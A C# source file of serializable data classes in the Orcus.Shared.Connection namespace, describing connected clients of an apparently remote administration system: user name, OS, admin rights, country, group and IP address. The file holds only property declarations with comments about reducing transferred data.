using System;
using System.Collections.Generic;

namespace Orcus.Shared.Connection
{
    /// <summary>
    ///     This class provides all clients with as less data as possible (enough for sorting and grouping)
    /// </summary>
    [Serializable]
    public class LightInformation
    {
        /// <summary>
        ///     All clients
        /// </summary>
        public List<LightClientInformation> Clients { get; set; }

        /// <summary>
        ///     To reduce data, all group names are in this list and the <see cref="Clients" /> only have the index of the group
        /// </summary>
        public List<string> Groups { get; set; }

        /// <summary>
        ///     To reduce data, all operating system names are in this list and the <see cref="Clients" /> only have the index of
        ///     the group
        /// </summary>
        public List<string> OperatingSystems { get; set; }
    }

    /// <summary>
    ///     More information than <see cref="LightInformation" />, but data visualization is not required to display all
    ///     important information
    /// </summary>
    [Serializable]
    public class LightInformationApp
    {
        /// <summary>
        ///     To reduce data, all group names are in this list and the <see cref="Clients" /> only have the index of the group
        /// </summary>
        public List<string> Groups { get; set; }

        /// <summary>
        ///     To reduce data, all operating system names are in this list and the <see cref="Clients" /> only have the index of
        ///     the group
        /// </summary>
        public List<string> OperatingSystems { get; set; }

        /// <summary>
        ///     All clients
        /// </summary>
        public List<LightClientInformationApp> Clients { get; set; }
    }

    /// <summary>
    ///     Basic information about a client
    /// </summary>
    [Serializable]
    public class BaseClientInformation
    {
        /// <summary>
        ///     The user name of the client's operating system
        /// </summary>
        public string UserName { get; set; }

        /// <summary>
        ///     The id of the client on the server
        /// </summary>
        public int Id { get; set; }

        /// <summary>
        ///     The operating system type of the client
        /// </summary>
        public OSType OsType { get; set; }

        /// <summary>
        ///     The api version (for the administration)
        /// </summary>
        public short ApiVersion { get; set; }

        /// <summary>
        ///     If the client is executed with administrator privileges
        /// </summary>
        public bool IsAdministrator { get; set; }

        /// <summary>
        ///     If the client is connected to the service
        /// </summary>
        public bool IsServiceRunning { get; set; }

        /// <summary>
        ///     The language of the operating system as two letter iso (also with country code)
        /// </summary>
        public string Language { get; set; }

        /// <summary>
        ///     The country the client was located in
        /// </summary>
        public string LocatedCountry { get; set; }

        /// <summary>
        ///     If the client is currently online
        /// </summary>
        public bool IsOnline { get; set; }

        /// <summary>
        ///     The group the client currently has
        /// </summary>
        public string Group { get; set; }

        /// <summary>
        ///     The complete name of the operating system
        /// </summary>
        public string OsName { get; set; }
    }

    /// <summary>
    ///     To reduce data, it adds the two property to identify it with a group and operating system
    /// </summary>
    [Serializable]
    public class LightClientInformation : BaseClientInformation
    {
        /// <summary>
        ///     The index of the client's group
        /// </summary>
        public short GroupId { get; set; }

        /// <summary>
        ///     The index of the client's operating system
        /// </summary>
        public short OsNameId { get; set; }
    }

    /// <summary>
    ///     More information to display on apps
    /// </summary>
    [Serializable]
    public class LightClientInformationApp : LightClientInformation
    {
        /// <summary>
        ///     The ip address of the client
        /// </summary>
        public string IpAddress { get; set; }

        /// <summary>
        ///     The time stamp the client connected at
        /// </summary>
        public DateTime OnlineSince { get; set; }
    }
}